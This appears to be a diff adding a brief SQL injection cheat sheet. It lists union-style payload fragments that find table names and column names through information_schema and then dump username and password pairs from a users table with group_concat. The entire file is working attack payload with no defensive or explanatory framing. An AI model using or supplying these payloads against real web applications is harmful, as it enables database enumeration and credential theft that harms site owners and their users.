@@ -1,0 +1,8 @@
+find table
+group_concat(table_name),_ from information_schema.tables where table_schema=database()
+
+find column
+group_concat(column_name),_ from information_schema.columns where table_schema=database() and table_name='TABLE_NAME'
+
+dump it all
+group_concat(user,0x3a,pass),_ from users
